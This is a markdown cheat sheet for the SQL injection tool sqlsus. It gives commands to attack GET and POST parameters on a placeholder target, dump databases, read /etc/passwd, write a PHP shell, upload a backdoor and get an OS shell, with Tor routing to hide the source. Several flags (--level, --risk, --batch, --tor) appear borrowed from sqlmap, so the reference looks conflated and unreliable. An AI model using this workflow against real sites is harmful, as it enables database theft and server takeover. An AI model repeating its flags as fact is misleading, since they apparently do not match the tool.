# sqlsus - Quick Reference

## Quick Start
```bash
sqlsus -g http://target.com/page.php?id=1
```
**Explanation:** Launches sqlsus against a GET parameter URL.

## Essential Commands

| Command | Description |
|---------|-------------|
| `sqlsus -g URL` | Attack a GET parameter |
| `sqlsus -p URL` | Attack a POST parameter |
| `sqlsus -g URL --cookie "session=abc"` | Attack with cookies |
| `sqlsus -g URL --level 5` | Maximum injection depth |
| `sqlsus -g URL --batch` | Non-interactive mode |
| `sqlsus -g URL -o output.log` | Save session to file |
| `sqlsus -r session.log` | Resume from saved session |

## Common Flags

| Flag | Description |
|------|-------------|
| `-g URL` | GET request URL with injectable param |
| `-p URL` | POST request URL |
| `--cookie` | Set cookies |
| `--level` | Test level (1-5) |
| `--risk` | Risk level (1-3) |
| `--batch` | Non-interactive |
| `--proxy` | Use proxy |
| `--tor` | Route through Tor |
| `-o FILE` | Output session file |
| `-r FILE` | Resume session |
| `--flush-logs` | Clear session logs |

## Attack Modes

| Mode | Command |
|------|---------|
| Database enumeration | `sqlsus -g URL` then `database` |
| Table listing | `sqlsus -g URL` then `tables` |
| Data dump | `sqlsus -g URL` then `dump` |
| File read | `sqlsus -g URL` then `read /etc/passwd` |
| File write | `sqlsus -g URL` then `write shell.php` |
| OS shell | `sqlsus -g URL` then `shell` |
| Backdoor upload | `sqlsus -g URL` then `backdoor` |

## Workflow
1. Identify injectable URL: `sqlsus -g http://target.com/page.php?id=1`
2. Enumerate databases: type `database` at prompt
3. Enumerate tables: type `tables` at prompt
4. Dump data: type `dump` at prompt
5. Get OS access: type `shell` at prompt

## Session Management
```bash
# Save session
sqlsus -g URL -o session.log

# Resume session
sqlsus -r session.log

# Flush logs
sqlsus -g URL --flush-logs
```

## Proxy Configuration
```bash
# HTTP proxy
sqlsus -g URL --proxy http://127.0.0.1:8080

# SOCKS through Tor
sqlsus -g URL --tor
```
